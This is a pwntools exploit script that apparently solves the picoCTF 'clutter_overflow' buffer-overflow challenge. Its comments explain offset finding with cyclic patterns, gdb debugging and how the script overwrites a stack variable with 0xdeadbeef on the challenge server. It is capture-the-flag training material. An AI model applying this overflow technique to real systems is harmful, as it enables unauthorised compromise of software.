from pwn import * 

#I used these lines for local debugging
#target = process('./clutter_overflow')

#This wasn't necessary since the program prints the values.
#If it didn't print the values, you could check it was working by viewing the contents of the addresses being compared on the line that this breaks at

#pid = gdb.attach(target, "\nb *main+143\ncontinue")

target = remote('mars.picoctf.net', 31890)


print(target.recvuntil(b'What do you see?'))

#This could be used in alternative way to find the padding. You would look at the value in code if this payload is passed, and determine the offset of the unique substring within the cyclic string.
payload = cyclic(1000)

padding = b'a' * 264
payload = padding
#This is an easy way to encode numeric values into bytes. In little endian, the bytes are '\xef\xbe\xad\xde\x00\x00\x00\x00
payload += p64(0xdeadbeef)

target.sendline(payload)

#Not necessary here, but it's good practice to put this at the end since if you are trying to open a shell, it will close immediately if this isn't here.
target.interactive()
